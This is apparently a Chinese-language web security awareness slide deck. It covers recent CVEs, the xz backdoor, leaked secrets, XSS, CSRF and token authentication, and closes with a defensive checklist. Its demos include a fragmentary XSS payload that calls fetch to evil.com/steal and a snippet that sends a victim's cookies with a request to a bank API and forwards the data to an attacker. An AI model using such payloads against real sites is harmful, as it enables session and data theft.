這一年間被攻擊的不是別人，是真實產品與團隊的血淚。

⚠️

CVE-2024-44308：Safari 零時差攻擊

針對 WebKit 的惡意網頁可執行任意程式碼，Apple 確認此弱點已在 Intel 架構的 Mac 上遭利用，並於 2024-11-21 推出 Safari 18.1.1、iOS/iPadOS 17.7.2、18.1.1 及 macOS Sequoia 15.1.1 修補。

→ 不更新的裝置，等同讓攻擊者遠端開門。

🧪

xz Utils Backdoor（CVE-2024-3094）

攻擊者長期以「熱心維護者」身分提交 PR、要求掌控發佈流程，最終將惡意壓縮程式碼塞進正式版本，使得 OpenSSH 等服務在連線時可能被植入後門。

→ PR 沒有審查與二人制，供應鏈就被拿走鑰匙。

🔑

密鑰外洩：GitHub 公開庫的日常

GitGuardian《State of Secrets Sprawl 2024》統計，僅 2023 年就在 GitHub 公開庫偵測到 1,280 萬筆秘密金鑰（含 AWS Key、API Token），其中多起被自動化掃描工具立即濫用。

→ commit 前沒檢查，就等於把雲端帳單與客戶資料送人。

  fetch('https://evil.com/steal', {

  });
">
  🎁 點擊領取優惠
</button>

💡 演示說明：左側是使用者看到的畫面（已渲染），右側是攻擊者輸入的原始 HTML 代碼。當網站使用 innerHTML 直接輸出時，惡意腳本就會執行。

XSS 檢測與防護

🔍 檢測方法

貼 HTML 看前端是否解析

🛡️ 修法

1. 避免 innerHTML（最簡單）

2. 使用 sanitizer（DOMPurify）

↳ DOMPurify 是一個「內容清潔機」，用來清除使用者輸入中的惡意程式碼。

3. 部署 CSP（Content Security Policy）

↳ CSP 是一個瀏覽器安全規則，用來限制哪些程式碼或資源能在你的網站上執行。

CSRF — Cross-Site Request Forgery

🎭 具體場景

你登入網路銀行後
又開了另一個分頁逛網站
→ 那個網站偷偷幫你轉帳

📄 就像

你帶著公司識別證進了大樓
有人趁你不注意拿你的證
去刷門禁、領東西
警衛以為是你本人

CSRF 原理與演示

👤

使用者
登入 A 網站

🍪 Cookie
→
😈

惡意 B 網站
偷發請求

GET /api/user
→
🏦

A 網站
自動帶 Cookie

✓ 驗證通過

🏦 A 網站（銀行）

模擬登入狀態

Cookie: session=abc123

😈 B 網站（惡意）

fetch('https://bank-a.com/api/user', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {

  // 竊取會員資料
  sendToAttacker(data);

});

💡 CSRF 關鍵：瀏覽器會自動把 A 網站的 Cookie 帶到 B 網站發出的請求中！即使你在 B 網站，請求 A 網站的 API 時，Cookie 仍會自動附上，導致 A 網站誤認為是合法請求。

CSRF 防護措施

🍪 Cookie 設定

SameSite=Lax/Strict + Secure + HttpOnly

🎫 CSRF Token

後端發 Token，前端回送驗證

🔐 二次驗證

重要操作要求再次輸入密碼/OTP

第三方腳本 / 供應鏈風險

📖 真實案例

客服聊天外掛被駭 → 插入假通知 → 3 小時 2,000+ 人上當

⛓️

外部 JS 被攻陷 → 全站受影響

Token 認證機制

就像辦公大樓的臨時通行證

📝

❌ 明碼密碼

把身分證號碼
寫在胸前走來走去
→ 永久性風險

🎫

✓ Token

臨時通行證
過期就失效
→ 限時有效

🏢 實際運作

1️⃣ 早上 9:00 → 警衛發給你今日通行證（登入取得 Token）

2️⃣ 下午 6:00 → 通行證失效（Token 過期）

3️⃣ 明天重新領證（重新登入）

為什麼明碼是永久性風險？

☕ 咖啡廳偷窺

→ 有人看到你螢幕上的密碼

→ 永遠可以登入

💾 資料庫被駭

→ 所有密碼被看光

→ 受害者換密碼前都有效

🔗 撞庫攻擊

→ 同密碼用多個網站

→ 一個被盜全部遭殃

👥 內部員工

→ 離職員工還記得密碼

→ 隨時可能回來搞破壞

✅ Token 如何解決

Token 每 15 分鐘過期 → 即使被偷，時間到就失效
離職員工的 Token 立即撤銷 → 無法再進入系統

你可以檢查的 Token 安全指標

不用懂技術,也能看出系統有沒有做好

✅ 會自動登出?

15-30 分鐘沒操作應該登出
→ 有設定有效期限

✅ 需二次驗證?

轉帳/改密碼要再輸密碼
→ 有額外防護

✅ 可登出所有裝置?

一鍵撤銷所有登入
→ 可撤銷 Token

✅ 異常登入通知?

新裝置登入會收通知
→ 有偵測異常

為什麼 Token 比明碼密碼安全?

⏱️

有效期限

過期自動失效

🚫

可撤銷

登出立即失效

🔐

防偽造

數位簽名驗證

🔔

異常偵測

綁定裝置資訊

明碼密碼 = 永久鑰匙 (被偷永久有效)

Token = 臨時通行證 (限時、可撤銷、可偵測)

企業級資安防護的真實樣貌

我們今天介紹的只是入門基礎，企業級標準做了非常非常多事情

來源：Microsoft Cybersecurity Reference Architecture (MCRA)

常見誤區 & 快速問答

❌ 大平台 = 安全？

平台基礎設施安全

但你的設定、第三方元件仍會帶來風險

❌ 小站不會被攻擊？

攻擊者用自動掃描器

不管大小站都會被掃到

❌ 前端顯示 = 正確？

前端只是介面

後端必須做最後驗證

❌ HTTPS = 絕對安全？

HTTPS 只保護傳輸

XSS、CSRF 照樣會發生

安全 = 流程 + 習慣 + 檢查

快速自查清單

實際操作前，用這六個問題確認自己站在資安友善的軌道上。

  • 心態校準 前端只負責介面，權限與驗證都交給後端；遇到異常先暫停並回報。
  • 請求體檢視 檢查 API request body，有沒有 price、role 等敏感數值；後端是否直接依這些值處理？那是 NG。
  • 輸入與顯示 留言、備註等欄位是否經過跳脫或驗證？畫面有沒有直接呈現使用者輸入的 HTML？
  • 登入安全 Cookie 設定 SameSite=Lax/Strict、HttpOnly 嗎？敏感操作會再要求 OTP 或再次輸入密碼嗎？
  • 第三方資源 列出外部 JS / CDN 來源，確認維運者可信且有備援方案，必要時考慮自建或鎖版。
  • 異常處理 發現異常價格或登入紀錄時，有沒有既定的紀錄方式、通報名單與回應流程？
